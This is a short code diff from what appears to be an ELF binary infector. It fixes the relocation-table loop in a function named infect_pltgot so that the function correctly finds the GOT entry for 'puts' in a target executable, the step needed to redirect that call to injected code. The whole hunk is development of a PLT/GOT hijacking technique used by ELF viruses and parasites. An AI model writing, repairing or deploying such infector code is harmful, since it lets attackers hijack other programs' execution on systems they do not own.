@@ -635,9 +635,9 @@ int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 		return -1;
 	}
 	for (i = 0; i < jmprel_size / sizeof(Elf64_Rela); i++) {
-		if (!_strcmp(&strtab[symtab[ELF64_R_SYM(jmprel->r_info)].st_name], "puts")) {
-			gotaddr = jmprel->r_offset;
-			gotoff = target->dataOff + (jmprel->r_offset - target->dataVaddr);
+		if (!_strcmp(&strtab[symtab[ELF64_R_SYM(jmprel[i].r_info)].st_name], "puts")) {
+			gotaddr = jmprel[i].r_offset;
+			gotoff = target->dataOff + (jmprel[i].r_offset - target->dataVaddr);
 			DEBUG_PRINT("gotaddr: %x gotoff: %x\n", gotaddr, gotoff);
 			break;
 		}
